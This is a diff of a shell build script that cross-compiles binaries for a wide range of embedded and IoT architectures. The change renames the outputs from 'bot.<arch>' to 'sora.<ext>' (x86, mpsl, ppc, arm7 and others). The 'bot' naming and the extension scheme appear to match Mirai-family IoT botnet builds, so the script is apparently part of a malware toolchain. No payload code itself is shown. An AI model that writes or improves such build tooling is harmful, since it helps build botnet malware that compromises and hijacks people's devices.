@@ -185,25 +185,25 @@ EOF
 echo -e "${BLUE}Starting compilation process...${NC}"
 echo
 
-# List of architectures to compile for
+# List of architectures to compile for with their output extensions
 declare -A ARCHITECTURES=(
-    ["i586"]="i586"
+    ["i586"]="x86"
     ["m68k"]="m68k" 
     ["mips"]="mips"
-    ["mipsel"]="mipsel"
-    ["powerpc"]="powerpc"
+    ["mipsel"]="mpsl"
+    ["powerpc"]="ppc"
     ["sh4"]="sh4"
-    ["sparc"]="sparc"
-    ["armv4l"]="armv4l"
-    ["armv5l"]="armv5l"
-    ["armv6l"]="armv6l"
-    ["armv7l"]="armv7l"
+    ["sparc"]="spc"
+    ["armv4l"]="arm"
+    ["armv5l"]="arm5"
+    ["armv6l"]="arm6"
+    ["armv7l"]="arm7"
 )
 
 # Compile for each architecture
 for arch in "${!ARCHITECTURES[@]}"; do
     compiler_name="${ARCHITECTURES[$arch]}"
-    output_name="bot.${arch}"
+    output_name="sora.${ARCHITECTURES[$arch]}"
     
     echo -e "${BLUE}=== Compiling for $arch ===${NC}"
     compile_arch "$arch" "$compiler_name" "$output_name"
@@ -221,7 +221,7 @@ ls -la "$OUTPUT_DIR"/* 2>/dev/null || echo "No binaries found"
 echo
 echo -e "${BLUE}=== Usage Instructions ===${NC}"
 echo "1. The compiled binaries are in: $OUTPUT_DIR"
-echo "2. Each binary is named: bot.<architecture>"
+echo "2. Each binary is named: sora.<extension>"
 echo "3. Use the appropriate binary for the target architecture"
 echo "4. Run test_binaries.sh to get information about compiled binaries"
 echo
